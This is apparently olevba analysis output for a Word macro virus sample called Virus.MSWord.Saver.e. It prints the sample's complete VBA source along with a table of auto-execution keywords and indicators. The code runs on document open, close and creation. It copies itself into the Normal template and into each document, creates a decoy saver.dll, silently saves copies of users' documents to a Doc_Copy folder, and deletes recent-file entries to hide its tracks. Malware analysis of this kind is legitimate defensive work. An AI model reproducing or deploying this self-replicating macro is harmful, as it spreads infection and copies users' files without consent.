olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Saver.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Saver.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Saver.bas 
in file: ./Virus.MSWord.Saver.e - OLE stream: 'Macros/VBA/Saver'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Mac(dr)
Attribute Mac.VB_Description = "Ìàêðîñ çàïèñàí 02.02.00 ÊÎÍÎÒÎÏ"
Attribute Mac.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ1"
 If (Dir(dr, vbDirectory) = "") Then MkDir (dr)
End Sub
Sub Setup()


  On Error Resume Next
  
  If Word.ActiveDocument.Name = "saver.dll" Then MsgBox "Saver!"
    
  zz = Word.ActiveDocument.FullName
  
  Application.OrganizerCopy Source:=zz, _
      Destination:=Normal.ThisDocument.FullName, Name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=zz, Name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
  yy = Word.Application.Path + "\saver.dll"
  
  If (Dir(yy) = "") Then
    Application.Documents.Add
    Application.Documents(1).SaveAs (yy)
    Application.Documents(1).Close SaveChanges:=False
    Word.RecentFiles.Item(1).Delete
  End If
  
  
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=yy, Name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=zz, _
      Destination:=yy, Name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=yy, _
      Destination:=zz, Name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
End Sub
Sub AutoNew()
  dr = Word.Application.Path + "\Doc_Copy"
  Mac (dr)
End Sub
Sub AutoOpen()
  Setup
  dr = Word.Application.Path + "\Doc_Copy"
  Mac (dr)
  If Word.ActiveDocument.Name = "saver.dll" Then Word.ActiveDocument.Close
End Sub
Sub AutoClose()
  dr = Word.Application.Path + "\Doc_Copy"
  Pat = dr + "\" + ActiveDocument.Name
  If Word.ActiveDocument.Name <> "saver.dll" Then
    On Error Resume Next
    ActiveDocument.Saved = False
    ActiveDocument.Save
    ActiveDocument.SaveAs (Pat)
  End If
  Word.RecentFiles.Item(1).Delete
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|MkDir               |May create a directory                       |
|IOC       |saver.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

